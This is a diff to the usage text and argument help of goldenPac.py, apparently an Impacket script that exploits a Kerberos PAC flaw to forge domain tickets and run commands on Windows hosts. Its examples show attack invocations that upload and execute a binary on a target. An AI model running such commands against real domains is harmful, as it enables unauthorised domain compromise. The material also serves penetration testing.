@@ -22,13 +22,13 @@
 #   5) Use WMIEXEC approach instead
 #
 #   E.G:
-#       python goldenPac domain.net/normaluser@domain-dc
+#       python goldenPac domain.net/normaluser@domain-host
 #       the password will be asked, or
 #
-#       python goldenPac.py domain.net/normaluser:mypwd@domain-dc
+#       python goldenPac.py domain.net/normaluser:mypwd@domain-host
 #
-#       if domain.net and/or domain-dc does not resolve, add them
-#       to the hosts file
+#       if domain.net and/or domain-host do not resolve, add them
+#       to the hosts file or use the -dc-ip and -target-ip parameters
 #
 
 import struct
@@ -1117,8 +1117,8 @@ if __name__ == '__main__':
     parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
     parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
     parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
-    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Adress of the domain controller you want to attack. If ommited it will be taken from the domain specified in the target parameter')
-    parser.add_argument('-target-ip', action='store',metavar = "ip address",  help='IP Adress target host you want to attack. If ommited it will use the targetName parameter')
+    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use the domain part (FQDN) specified in the target parameter')
+    parser.add_argument('-target-ip', action='store',metavar = "ip address",  help='IP Address of the target host you want to attack. If ommited it will use the targetName parameter')
 
     group = parser.add_argument_group('authentication')
 
@@ -1126,14 +1126,14 @@ if __name__ == '__main__':
     if len(sys.argv)==1:
         parser.print_help()
         print "\nExamples: "
-        print "\tpython goldenPac domain.net/normaluser@domain-dc\n"
+        print "\tpython goldenPac domain.net/normaluser@domain-host\n"
         print "\tthe password will be asked, or\n"
-        print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-dc\n"
-        print "\tif domain.net and/or domain-dc does not resolve, add them"
-        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1):\n"
-        print "\tpython goldenPac.py -dc-ip 1.1.1.1 domain.net/normaluser:mypwd@domain-dc\n"
+        print "\tpython goldenPac.py domain.net/normaluser:mypwd@domain-host\n"
+        print "\tif domain.net and/or domain-machine do not resolve, add them"
+        print "\tto the hosts file or explicity specify the domain IP (e.g. 1.1.1.1) and target IP:\n"
+        print "\tpython goldenPac.py -dc-ip 1.1.1.1 -target-ip 2.2.2.2 domain.net/normaluser:mypwd@domain-host\n"
         print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
-        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-dc param1 param2 paramn\n"
+        print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
         sys.exit(1)
  
     options = parser.parse_args()
